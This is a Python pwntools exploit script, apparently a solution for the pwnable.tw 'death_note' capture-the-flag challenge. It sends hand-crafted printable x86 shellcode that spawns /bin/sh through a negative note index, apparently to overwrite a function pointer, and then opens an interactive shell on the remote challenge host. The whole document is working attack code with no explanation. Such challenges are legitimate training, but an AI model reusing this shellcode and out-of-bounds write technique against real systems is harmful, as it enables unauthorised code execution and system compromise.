import pwn 
from pwn import *
#p = gdb.debug("./death_note")
p  = remote("chall.pwnable.tw",10201 )
context.binary = "death_note"
context.log_level = 'DEBUG'

def addnote(index,payload):
 p.sendlineafter(b"choice :",b"1")
 p.sendlineafter(b"Index :",index)
 p.sendlineafter(b"Name :",payload)


shellcode = asm(
"""
push 0x68
push 0x732f2f2f
push 0x6e69622f
push esp
pop ebx 

push edx
pop eax
push 0x58
pop edx
sub byte ptr [eax+39], dl
sub byte ptr [eax+40], dl
push 0x70
pop edx
xor byte ptr [eax+40], dl
push ecx
pop eax
push ecx
pop edx
xor al, 0x67
xor al, 0x6c 
""") + b"\x25\x48"
addnote(b"-16",shellcode)
p.interactive()
